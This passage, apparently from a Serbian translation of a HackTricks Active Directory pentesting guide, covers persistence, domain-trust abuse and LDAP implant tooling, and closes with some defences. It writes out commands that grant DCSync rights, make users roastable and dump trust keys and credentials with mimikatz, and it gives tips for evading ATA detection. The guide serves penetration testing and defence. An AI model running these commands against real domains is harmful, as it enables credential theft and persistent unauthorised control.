[**Više informacija o tome kako ukrasti NTDS.dit možete naći ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Neke od tehnika pomenutih ranije mogu se koristiti za persistence.\
Na primer, mogli biste:

- Učiniti korisnike ranjivim na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Učiniti korisnike ranjivim na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Dati [**DCSync**](#dcsync) privilegije korisniku

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Silver Ticket attack kreira **legitiman Ticket Granting Service (TGS) ticket** za određeni servis koristeći **NTLM hash** (na primer, **hash PC account-a**). Ova metoda se koristi za **pristup privilegijama servisa**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Golden Ticket attack uključuje napadača koji dobija pristup **NTLM hash-u krbtgt account-a** u Active Directory okruženju. Taj nalog je specijalan jer se koristi za potpisivanje svih **Ticket Granting Tickets (TGTs)**, koji su ključni za autentikaciju unutar AD mreže.

Kada napadač dobije taj hash, može kreirati **TGT-ove** za bilo koji nalog po izboru (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ovo su kao golden ticket-i, ali falsifikovani na način koji **zaobilazi uobičajene mehanizme za detekciju golden ticket-ova.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Imati sertifikate naloga ili moći da ih zatražite** je vrlo dobar način da se zadržite u korisničkom nalogu (čak i ako on promeni lozinku):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Korišćenjem sertifikata takođe je moguće održati persistence sa visokim privilegijama unutar domena:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Objekat **AdminSDHolder** u Active Directory obezbeđuje sigurnost **privilegovanih grupa** (kao što su Domain Admins i Enterprise Admins) primenom standardnog **ACL-a** preko ovih grupa kako bi se sprečile neautorizovane promene. Međutim, ova funkcionalnost se može zloupotrebiti; ako napadač izmeni AdminSDHolder-ov ACL i dodeli pun pristup običnom korisniku, taj korisnik dobija široku kontrolu nad svim privilegovanim grupama. Ova sigurnosna mera, zamišljena da štiti, može da se obije o glavu i dozvoli neovlašćen pristup osim ako se pažljivo ne nadgleda.

[**Više informacija o AdminDSHolder Group ovde.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

U svakom **Domain Controller (DC)** postoji **lokalni administrator** nalog. Dobijanjem admin prava na takvoj mašini, hash lokalnog Administratora može se izvući korišćenjem **mimikatz**. Nakon toga je neophodna izmena registra da bi se **omogućila upotreba te lozinke**, dozvoljavajući daljinski pristup lokalnom Administrator nalogu.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možete **dati** neke **specijalne dozvole** korisniku nad nekim specifičnim domain objektima koje će tom korisniku omogućiti da **eskalira privilegije u budućnosti**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** se koriste za **čuvanje** **permissions** koje neki **objekat** ima **nad** drugim objektima. Ako možete da napravite i **malo izmenu** u **security descriptor-u** nekog objekta, možete dobiti veoma interesantne privilegije nad tim objektom bez potrebe da budete član privilegovane grupe.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji da biste uspostavili **univerzalnu lozinku**, što daje pristup svim domen nalozima.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Saznajte šta je SSP (Security Support Provider) ovde.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete napraviti svoj **SSP** da **uhvatite** u **clear text** **kredencijale** koji se koriste za pristup mašini.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registruje **novi Domain Controller** u AD i koristi ga da **gurne atribute** (SIDHistory, SPNs...) na određene objekte **bez** ostavljanja log-ova o **izmenama**. Potrebne su vam DA privilegije i da budete unutar **root domena**.\
Napomena: ako koristite pogrešne podatke, pojaviće se prilično ružni log-ovi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Prethodno smo diskutovali kako eskalirati privilegije ako imate **dovoljne dozvole da pročitate LAPS password-e**. Međutim, ove lozinke se takođe mogu koristiti za **održavanje persistence**.\
Pogledajte:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft smatra **Forest** sigurnosnom granicom. To implicira da **kompromitovanje jednog domena može potencijalno dovesti do kompromitovanja čitavog Forest-a**.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je sigurnosni mehanizam koji omogućava korisniku iz jednog **domena** da pristupi resursima u drugom **domenu**. On zapravo kreira vezu između sistema autentikacije ta dva domena, omogućavajući protok verifikacija autentikacije. Kada domeni uspostave trust, oni razmenjuju i čuvaju specifične **ključeve** unutar svojih **Domain Controller-a (DCs)**, koji su ključni za integritet trust-a.

U tipičnom scenariju, ako korisnik želi da pristupi servisu u **trusted domain-u**, prvo mora da zatraži specijalan tiket poznat kao **inter-realm TGT** od DC-a svog domena. Taj TGT je enkriptovan sa zajedničkim **ključem** koji su oba domena dogovorila. Korisnik zatim predaje taj inter-realm TGT **DC-u trusted domain-a** da bi dobio service ticket (**TGS**). Nakon uspešne verifikacije inter-realm TGT-a od strane DC-a trusted domain-a, on izdaje TGS, dajući korisniku pristup servisu.

**Koraci**:

1. **Klijent računar** u **Domain 1** započinje proces koristeći svoj **NTLM hash** da zatraži **Ticket Granting Ticket (TGT)** od svog **Domain Controller-a (DC1)**.
2. DC1 izdaje novi TGT ako je klijent uspešno autentifikovan.
3. Klijent zatim traži **inter-realm TGT** od DC1, koji je potreban za pristup resursima u **Domain 2**.
4. Inter-realm TGT je enkriptovan sa **trust key-om** koji DC1 i DC2 dele kao deo dvosmernog domain trust-a.
5. Klijent odnosi inter-realm TGT na **Domain 2-ov Domain Controller (DC2)**.
6. DC2 verifikuje inter-realm TGT koristeći deljeni trust key i, ako je validan, izdaje **Ticket Granting Service (TGS)** za server u Domain 2 kojem klijent želi pristupiti.
7. Na kraju, klijent predaje ovaj TGS serveru, koji je enkriptovan hash-om server naloga, kako bi dobio pristup servisu u Domain 2.

### Different trusts

Važno je primetiti da **trust može biti jednosmeran ili dvosmeran**. U dvosmernoj opciji, oba domena će verovati jedno drugom, ali u **jednosmernoj** relaciji jedan od domena će biti **trusted**, a drugi **trusting** domen. U ovom poslednjem slučaju, **moći ćete da pristupite resursima unutar trusting domena samo iz trusted domena**.

Ako Domain A trust-uje Domain B, A je trusting domen, a B je trusted. Štaviše, u **Domain A** to bi bilo **Outbound trust**; a u **Domain B** to bi bilo **Inbound trust**.

**Različiti tipovi trusting odnosa**

- **Parent-Child Trusts**: Ovo je uobičajena konfiguracija unutar istog forest-a, gde child domen automatski ima dvosmerni transitive trust sa svojim parent domenom. Suštinski, to znači da autentikacioni zahtevi mogu nesmetano da teku između parent-a i child-a.
- **Cross-link Trusts**: Poznati kao "shortcut trusts", uspostavljaju se između child domena da ubrzaju referral procese. U složenim forest-ovima, autentikacioni referral obično mora da putuje do root-a forest-a pa onda do ciljnog domena. Kreiranjem cross-linkova, put se skraćuje, što je naročito korisno u geografski rasutim okruženjima.
- **External Trusts**: Postavljaju se između različitih, nepovezanih domena i po prirodi su non-transitive. Prema [Microsoft dokumentaciji](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trust-ovi su korisni za pristup resursima u domenu izvan trenutnog forest-a koji nije povezan forest trust-om. Bezbednost se pojačava SID filtering-om kod external trust-ova.
- **Tree-root Trusts**: Ovi trust-ovi se automatski uspostavljaju između forest root domena i novo dodatog tree root-a. Iako nisu često susretani, tree-root trust-ovi su važni za dodavanje novih domain tree-ova u forest, omogućavajući im da zadrže jedinstveno ime domena i osiguravajući dvosmernu transitivnost. Više informacija je u [Microsoft vodiču](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ovaj tip trust-a je dvosmeran transitive trust između dva forest root domena, takođe primenjujući SID filtering za pojačanje bezbednosti.
- **MIT Trusts**: Ovi trust-ovi se uspostavljaju sa non-Windows, [RFC4120-kompatibilnim](https://tools.ietf.org/html/rfc4120) Kerberos domenima. MIT trust-ovi su specijalizovaniji i služe okruženjima koja zahtevaju integraciju sa Kerberos-based sistemima van Windows ekosistema.

#### Other differences in **trusting relationships**

- Trust relationship može biti i **transitive** (A trust-uje B, B trust-uje C, onda A trust-uje C) ili **non-transitive**.
- Trust relationship može biti postavljen kao **bidirectional trust** (oba se međusobno trust-uju) ili kao **one-way trust** (samo jedan trust-uje drugog).

### Attack Path

1. **Enumerišite** trusting odnose
2. Proverite da li neki **security principal** (user/group/computer) ima **pristup** resursima **drugog domena**, možda putem ACE unosa ili članstvom u grupama drugog domena. Potražite **odnose preko domena** (trust je verovatno kreiran zbog toga).
1. kerberoast u ovom slučaju može biti još jedna opcija.
3. **Kompromitujte** **naloge** koji mogu **pivot-ovati** kroz domene.

Napadači mogu dobiti pristup resursima u drugom domenu putem tri primarna mehanizma:

- **Local Group Membership**: Principali mogu biti dodati u lokalne grupe na mašinama, kao što je “Administrators” grupa na serveru, dajući im značajnu kontrolu nad tom mašinom.
- **Foreign Domain Group Membership**: Principali takođe mogu biti članovi grupa unutar stranog domena. Međutim, efikasnost ove metode zavisi od prirode trust-a i obima grupe.
- **Access Control Lists (ACLs)**: Principali mogu biti navedeni u **ACL-u**, naročito kao entiteti u **ACE-ovima** unutar **DACL-a**, dajući im pristup specifičnim resursima. Za one koji žele dublje da istraže mehaniku ACL-ova, DACL-ova i ACE-ova, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” je neprocenjiv resurs.

### Find external users/groups with permissions

Možete proveriti **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** da pronađete foreign security principals u domenu. To će biti korisnici/grupe iz **eksternog domena/foresta**.

Možete to proveriti u **Bloodhound** ili koristeći **powerview**:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Drugi načini za enumerisanje domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Postoje **2 trusted keys**, jedan za _Child --> Parent_ i drugi za _Parent_ --> _Child_.\
> Možete proveriti koji se koristi u trenutnom domenu pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskalirajte do Enterprise admin privilegija u child/parent domenu zloupotrebom trust-a pomoću SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje kako se Configuration Naming Context (NC) može eksploatisati je ključno. Configuration NC služi kao centralni repozitorijum za konfiguracione podatke kroz forest u Active Directory (AD) okruženjima. Ovi podaci se repliciraju na svaki Domain Controller (DC) unutar foresta, pri čemu writable DCs održavaju zapisivu kopiju Configuration NC. Za eksploataciju je potrebno imati **SYSTEM privilegije na DC-u**, po mogućstvu na child DC-u.

**Link GPO to root DC site**

Sites kontejner u Configuration NC sadrži informacije o site-ovima svih računara priključenih na domen unutar AD foresta. Djelujući sa SYSTEM privilegijama na bilo kojem DC-u, napadači mogu povezivati GPO-e sa root DC site-ovima. Ova akcija potencijalno kompromituje root domen manipulisanjem politikama koje se primenjuju na te site-ove.

Za detaljnije informacije možete istražiti rad na [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Jedan vektor napada je ciljano usmeravanje na privilegovane gMSA unutar domena. KDS Root key, neophodan za izračunavanje lozinki gMSA, čuva se u Configuration NC. Sa SYSTEM privilegijama na bilo kojem DC-u moguće je pristupiti KDS Root key-u i izračunati lozinke za bilo koji gMSA kroz forest.

Detaljna analiza i vodič korak-po-korak može se naći u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Komplementarni delegated MSA napad (BadSuccessor – zloupotreba migration atributa):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatna spoljna istraživanja: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ova metoda zahteva strpljenje i čekanje na kreiranje novih privilegovanih AD objekata. Sa SYSTEM privilegijama, napadač može izmeniti AD Schema tako da dodeli bilo kom korisniku potpuni control nad svim klasama. To može dovesti do neovlašćenog pristupa i kontrole nad novokreiranim AD objektima.

Dalje čitanje je dostupno na [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 ranjivost cilja kontrolu nad Public Key Infrastructure (PKI) objektima kako bi kreirala certificate template koji omogućava autentikaciju kao bilo koji korisnik u forestu. Pošto PKI objekti borave u Configuration NC, kompromitovanje writable child DC omogućava izvođenje ESC5 napada.

Više detalja moguće je pročitati u [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). U scenarijima bez ADCS-a, napadač ima mogućnost da postavi potrebne komponente, što je obrađeno u [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
U ovom scenariju **vaš domen je poveren** od strane eksternog domena koji vam daje **neodređena ovlašćenja** nad njim. Treba da otkrijete **koji subjekti vašeg domena imaju koji pristup nad eksternim domenom** i potom pokušate da ih iskoristite:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterni Forest domen - jednosmerni (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
U ovom scenariju **vaš domen** poverava neke **privilegije** principal-u iz **drugog domena**.

Međutim, kada je **domen poveren** od strane trusting domena, trusted domen **kreira user-a** sa **predvidivim imenom** koji koristi kao **password the trusted password**. To znači da je moguće **pristupiti user-u iz trusting domena da se uđe u trusted domen** da bi se izvršila enumeracija i pokušalo eskaliranje privilegija:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Još jedan način da se kompromituje trusted domen je pronalazak [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiranog u **suprotnoj smeru** od domain trust-a (što nije često).

Drugi način da se kompromituje trusted domen je da se sačeka na mašini na koju **user iz trusted domena može da pristupi** i prijavi se preko **RDP**. Zatim, napadač može da injektuje kod u proces RDP sesije i odatle **pristupi origin domain-u žrtve**.\
Štaviše, ako je **žrtva montirala svoj hard drive**, iz procesa **RDP session** napadač može da postavi **backdoors** u **startup folder of the hard drive**. Ova tehnika se zove **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigacija zloupotrebe poverenja između domena

### **SID Filtering:**

- Rizik napada koji koriste SID history atribut preko inter-forest trusts se ublažava SID Filtering-om, koji je aktiviran podrazumevano na svim inter-forest trust-ovima. Ovo počiva na pretpostavci da su intra-forest trusts bezbedni, uzimajući šumu (forest), a ne domen, kao bezbednosnu granicu u skladu sa Microsoft-ovim pristupom.
- Ipak, postoji problem: SID filtering može ometati aplikacije i pristup korisnika, zbog čega se ponekad deaktivira.

### **Selective Authentication:**

- Za inter-forest trusts, primena Selective Authentication osigurava da korisnici iz dve šume nisu automatski autentifikovani. Umesto toga, potrebna su eksplicitna dopuštenja da bi korisnici pristupili domenima i serverima unutar trusting domena ili šume.
- Važno je napomenuti da ove mere ne štite od zloupotrebe writable Configuration Naming Context (NC) ili napada na trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operateri kompajliraju paket sa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitaju `ldap.axs`, a zatim pozovu `ldap <subcommand>` iz beacon-a. Sav saobraćaj ide u okviru trenutnog logon security context-a preko LDAP (389) sa signing/sealing ili LDAPS (636) sa auto certificate trust, tako da nisu potrebni socks proxy-ji niti disk artifacts.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` rešavaju kratka imena/OU putanje u pune DN-ove i ispisuju odgovarajuće objekte.
- `get-object`, `get-attribute`, and `get-domaininfo` vade proizvoljne atribute (uključujući security descriptors) plus forest/domain metadata iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` otkrivaju roasting kandidate, delegation podešavanja i postojeće [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) deskriptore direktno iz LDAP-a.
- `get-acl` and `get-writable --detailed` parsiraju DACL da navedu trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) i nasleđivanje, dajući trenutne ciljeve za ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives za eskalaciju i perzistenciju

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operateru da postavi nove korisničke ili mašinske naloge tamo gde postoje OU prava. `add-groupmember`, `set-password`, `add-attribute`, i `set-attribute` direktno preuzimaju ciljeve čim se pronađu write-property prava.
- ACL-focused komande kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, i `add-dcsync` prevode WriteDACL/WriteOwner na bilo kojem AD objektu u reset lozinke, kontrolu članstva u grupi, ili DCSync privilegije bez ostavljanja PowerShell/ADSI artefakata. `remove-*` kontraodgovornici čiste injektovane ACE-ove.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` odmah čine kompromitovanog korisnika Kerberoastable; `add-asreproastable` (UAC toggle) označava korisnika za AS-REP roasting bez diranja lozinke.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) prepisuju `msDS-AllowedToDelegateTo`, UAC flagove, ili `msDS-AllowedToActOnBehalfOfOtherIdentity` iz beacon-a, omogućavajući constrained/unconstrained/RBCD puteve napada i eliminišući potrebu za remote PowerShell ili RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` ubacuje privilegovane SID-ove u SID history kontrolisanog principala (pogledaj [SID-History Injection](sid-history-injection.md)), omogućavajući prikriveno nasleđivanje pristupa potpuno preko LDAP/LDAPS.
- `move-object` menja DN/OU računara ili korisnika, dopuštajući napadaču da premesti resurse u OU-e gde već postoje delegirana prava pre nego što zloupotrebi `set-password`, `add-groupmember`, ili `add-spn`.
- Usko ciljane komande za uklanjanje (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, itd.) omogućavaju brz rollback nakon što operater prikupi kredencijale ili uspostavi perzistenciju, minimizirajući telemetriju.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Odbrambene mere za zaštitu kredencijala**

- **Domain Admins Restrictions**: Preporučuje se da Domain Admins imaju dozvolu za prijavu samo na Domain Controller-e, izbegavajući njihovu upotrebu na drugim hostovima.
- **Service Account Privileges**: Servisi ne bi trebalo da se pokreću sa Domain Admin (DA) privilegijama radi održavanja bezbednosti.
- **Temporal Privilege Limitation**: Za zadatke koji zahtevaju DA privilegije, trajanje tih privilegija treba ograničiti. Ovo se može postići komandama kao što je: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Auditujte Event ID-ove 2889/3074/3075 i potom primenite LDAP signing plus LDAPS channel binding na DC-ovima/klijentima kako biste blokirali LDAP MITM/relay pokušaje.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Primena tehnika obmane**

- Primena obmane uključuje postavljanje zamki, kao što su lažni korisnici ili računari, sa karakteristikama poput lozinki koje ne ističu ili koji su označeni kao Trusted for Delegation. Detaljan pristup uključuje kreiranje korisnika sa specifičnim pravima ili dodavanje u visokoprivilegovane grupe.
- Praktičan primer uključuje korišćenje alata kao što su: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više o postavljanju tehnika obmane nalazi se na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Prepoznavanje obmane**

- **Za korisničke objekte**: Sumnjivi indikatori uključuju netipičan ObjectSID, retke prijave, datume kreiranja i nizak broj pogrešnih lozinki.
- **Opšti indikatori**: Poređenje atributa potencijalnih zamki sa atributima stvarnih objekata može otkriti nedoslednosti. Alati kao što je [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u identifikaciji takvih obmana.

### **Zaobilaženje sistema za detekciju**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Izbegavanje enumeracije sesija na Domain Controller-ima kako bi se sprečilo otkrivanje od strane ATA.
- **Ticket Impersonation**: Korišćenje aes ključeva za kreiranje tiketa pomaže izbeći detekciju jer se ne vrši degradacija na NTLM.
- **DCSync Attacks**: Preporučuje se izvršavanje sa mašina koje nisu Domain Controller kako bi se izbegla ATA detekcija, jer će direktno izvršenje sa Domain Controller-a izazvati alarme.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
